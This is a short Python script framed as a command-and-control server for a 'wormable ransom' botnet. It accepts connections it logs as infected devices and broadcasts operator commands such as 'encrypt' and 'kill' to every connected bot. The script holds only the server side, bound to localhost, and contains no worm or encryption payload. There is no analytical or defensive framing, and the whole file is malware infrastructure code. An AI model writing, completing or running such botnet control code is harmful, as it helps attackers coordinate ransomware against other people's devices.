#!/usr/bin/env python3
import socket
import threading

bots = []

def handle_new_bots(server):
    while True:
        client, addr = server.accept()
        print(f"[C2] Wormbot infected device at {addr}")
        bots.append(client)

def broadcast(cmd):
    for bot in bots:
        try:
            bot.send(cmd.encode())
        except:
            bots.remove(bot)

def start_worm_c2():
    HOST = '127.0.0.1'
    PORT = 4444

    print(f"[C2 🧟‍♀️] Wormable Ransom C2 running on {HOST}:{PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    # Run bot accept loop in a thread
    threading.Thread(target=handle_new_bots, args=(server,), daemon=True).start()

    while True:
        cmd = input("C2 > Command (encrypt / kill / exit): ").strip()
        if cmd == "exit":
            print("[C2] Shutting down the worm C2...")
            break
        broadcast(cmd)

if __name__ == "__main__":
    start_worm_c2()
